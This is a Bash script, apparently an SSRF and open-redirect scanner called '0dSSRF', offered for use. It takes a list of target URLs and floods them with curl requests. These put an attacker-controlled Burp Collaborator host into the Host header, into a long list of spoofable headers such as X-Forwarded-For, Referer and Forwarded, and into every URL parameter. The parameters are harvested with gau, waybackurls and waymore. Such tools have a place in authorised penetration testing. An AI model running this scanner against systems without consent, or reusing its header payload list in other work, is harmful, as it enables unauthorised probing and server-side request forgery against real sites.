#!/bin/bash

# Define colors for output
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
light_blue='\033[0;94m'
NC='\033[0m' # No Color

#info
#Hi, It's Kariem Gamal, aka 0d.MErCiFul, from team 0dYSs3y.?
#this tool is to test SSRF and Open Redirect vulnerabilities

# Function to print the intro message
print_intro() {
  echo -e "${GREEN} _______  ______            _______  _______  ______                _____  "
  echo -e "${GREEN}(  ___  )(  __  \ |\     /|(  ____ \(  ____ \/ ___  \ |\     /|    / ___ \ "
  echo -e "${GREEN}| (   ) || (  \  )( \   / )| (    \/| (    \/\/   \  \( \   / )   ( (   ) )"
  echo -e "${GREEN}| |   | || |   ) | \ (_) / | (_____ | (_____    ___) / \ (_) /     \/  / / "
  echo -e "${GREEN}| |   | || |   | |  \   /  (_____  )(_____  )  (___ (   \   /         ( (  "
  echo -e "${GREEN}| |   | || |   ) |   ) (         ) |      ) |      ) \   ) (          | |  "
  echo -e "${GREEN}| (___) || (__/  )   | |   /\____) |/\____) |/\___/  /   | |    _     (_)  "
  echo -e "${GREEN}(_______)(______/    \_/   \_______)\_______)\______/    \_/   (_)     _   "
  echo -e "${GREEN}                                                                      (_)  "
  echo -e ""
  echo -e "${YELLOW}                         Welcome To 0dSSRF👑, ${NC}"
  echo -e ""
  echo -e ""
}

# intro function
print_intro


# Function to inject Host header
inject_host_header() {
  echo -e "${light_blue}[*] Injecting Burp Collaborator into Host header...${NC}"
  while IFS= read -r domain; do
    # Check if the domain is empty
    current_time=$(date +"%H:%M:%S")
    # Send the HTTP GET request using curl (background) with additional headers
    curl -H "Host: $Collab"  "$domain" &> /dev/null &
    # Print the processed domain for reference (optional)
    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $domain"
    # Wait for $Delay seconds before next iteration
    sleep $delay
  done < "$list"
  echo -e "${GREEN}✅ Injecting Burp Collaborator into Host header ${YELLOW}Finished ${NC}"
}

# Function to inject into common headers
inject_common_headers() {
  echo -e "${light_blue}[*] Injecting Burp Collaborator into common headers...${NC}"
  while IFS= read -r domain; do
    # Check if the domain is empty
    if [[ -z "$domain" ]]; then
      continue
    fi
    current_time=$(date +"%H:%M:%S")

    # Send the HTTP GET request using curl (background) with additional headers
    curl -H "From: root@$Collab" -H "User-Agent: Mozilla/5.0 root@$Collab" -H "Referer: http://$Collab/ref" -H "X-Original-URL: http://$Collab/" -H "X-Wap-Profile: http://$Collab/wap.xml" -H "Profile: http://$Collab/wap.xml" -H "X-Arbitrary: http://$Collab/" -H "X-HTTP-DestinationURL: http://$Collab/" -H "X-Forwarded-Proto: http://$Collab/" -H "Origin: http://$Collab/" -H "X-Forwarded-Host: $Collab" -H "X-Host: $Collab" -H "Proxy-Host: $Collab" -H "Destination: $Collab" -H "Proxy: http://$Collab/" -H "X-Forwarded-For: $Collab" -H "Contact: root@$Collab" -H "Forwarded: for=spoofed.$Collab;by=spoofed.$Collab;host=spoofed.$Collab" -H "X-Client-IP: $Collab" -H "Client-IP: $Collab" -H "True-Client-IP: $Collab" -H "CF-Connecting_IP: $Collab" -H "X-Originating-IP: $Collab" -H "X-Real-IP: $Collab" "$domain" &> /dev/null &    # Print the processed domain for reference (optional)
    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $domain"
    # Wait for $Delay seconds before next iteration
    #sleep $delay
done < "$list"
  echo -e "${GREEN}✅ Injecting Burp Collaborator into common headers ${YELLOW}Finished ${NC}"

}

# Function to handle the "-e" option
handle_e_option() {
  cat $list | awk -F'[://" ]+' '{print $2}' | sort -u > domains.txt
  main_Domain=$(grep -o '[^./]*\.[^./]*$' domains.txt | sort -u)
  # Call the main function
  inject_url_parameters "$main_Domain"
}

# Function to gather URLs and inject into parameters
inject_url_parameters() {
  echo -e "${light_blue}[*] Gathering URLs from $main_Domain...${NC}"
  printf $main_Domain | gau --subs --o gau.output --blacklist ttf,woff,svg,png,gif,jpeg,css,js && echo -e "${GREEN}[*] Extracted URLs from gau"
  cat domains.txt | waybackurls > waybackurls.output && echo -e "${GREEN}[*] Extracted URLs from waybackurls"
  waymore -i domains.txt -mode U -oU waymore.output -nd && echo -e "${GREEN}[*] Extracted URLs from waymore"
  cat gau.output waybackurls.output waymore.output | grep "=" > all_urls
  cat all_urls | uro -b jpg png js pdf css jpeg gif svg ttf woff > parms.txt && echo -e "${GREEN}[*]Collecting Parms ${YELLOW}finished${NC}"

  echo -e "${light_blue}[*] injecting Burp Collaborator into parameters...${NC}"
# Loop through each URL in the file
  while IFS= read -r url; do
  # Skip empty lines
  if [[ -z "$url" ]]; then
    continue
  fi
  # Extract parameters and inject separately
  IFS='&' read -r -a params <<< "$(echo "$url" | grep -oP '(?<=\?).*')"

  # Base URL without parameters
  base_url=$(echo "$url" | grep -oP '^[^?]+')

  # Loop through each parameter
  for param in "${params[@]}"; do
    # Extract key and value
    key=$(echo "$param" | cut -d'=' -f1)
    value=$(echo "$param" | cut -d'=' -f2)
    # Construct new URL with the parameter injected
    new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s/$key=$value/$key=http://$Collab/")"
    # Send the request
    curl -L "$new_url" &> /dev/null &
    current_time=$(date +"%H:%M:%S")
    echo -e "${YELLOW}$current_time ${NC}- Sent request to: $new_url"
    sleep $delay
  done
  done < "parms.txt"
  echo -e "${GREEN}✅ Injecting Burp Collaborator into parameters ${YELLOW}Finished ${NC}"
}

# Parse command-line options
while getopts "heps:c:l:" opt; do
  case $opt in
    h) stages+=("host") ;;
    e) stages+=("headers") ;;
    p) stages+=("parameters") ;;
    s) delay=$(echo "scale=2; 1/$OPTARG" | bc) ;;
    c) Collab="$OPTARG" ;;
    l) list="$OPTARG" ;;
    \?) echo "Invalid option -$OPTARG" >&2; exit 1 ;;
  esac
done

# Ensure required options are provided
if [ -z "$Collab" ] || [ -z "$delay" ] || [ -z "$list" ]; then
  echo "Usage: $0 -h|-e|-p -l urls_list.txt -c collaborator_id -s requests_per_second"
  exit 1
fi

# Run the selected stages
for stage in "${stages[@]}"; do
  case $stage in
    host) inject_host_header ;;
    headers) inject_common_headers "$Collab" ;;
    parameters) handle_e_option ;;
  esac
done


